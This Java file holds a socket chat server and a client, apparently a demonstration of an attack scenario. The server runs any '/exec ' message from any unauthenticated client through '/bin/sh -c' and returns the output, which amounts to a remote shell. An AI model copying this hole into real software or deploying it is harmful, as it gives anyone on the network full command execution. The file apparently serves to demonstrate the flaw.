import java.io.*;
import java.net.*;
import java.util.*;

class ChatServer {
    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = new ServerSocket(12345);
        System.out.println("Server started...");
        
        while (true) {
            Socket socket = serverSocket.accept();
            handleClient(socket);
        }
    }

    static void handleClient(Socket socket) {
        new Thread(() -> {
            try (
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true)
            ) {
                String message;
                while ((message = in.readLine()) != null) {
                    if (message.startsWith("/exec ")) {
                        String command = message.substring(5);
                        executeCommand(command, out);
                    } else {
                        System.out.println("Received: " + message);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    static void executeCommand(String command, PrintWriter out) {
        try {
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command);
            Process process = pb.start();
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(
                new InputStreamReader(process.getErrorStream()));
            
            String line;
            while ((line = reader.readLine()) != null) {
                out.println("[OUTPUT] " + line);
            }
            
            while ((line = errorReader.readLine()) != null) {
                out.println("[ERROR] " + line);
            }
            
        } catch (Exception e) {
            out.println("Command execution failed: " + e.getMessage());
        }
    }
}

// 客户端代码用于演示攻击场景
class ChatClient {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("localhost", 12345);
        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
        
        String userInput;
        while ((userInput = stdIn.readLine()) != null) {
            out.println(userInput);
            System.out.println(in.readLine());
        }
    }
}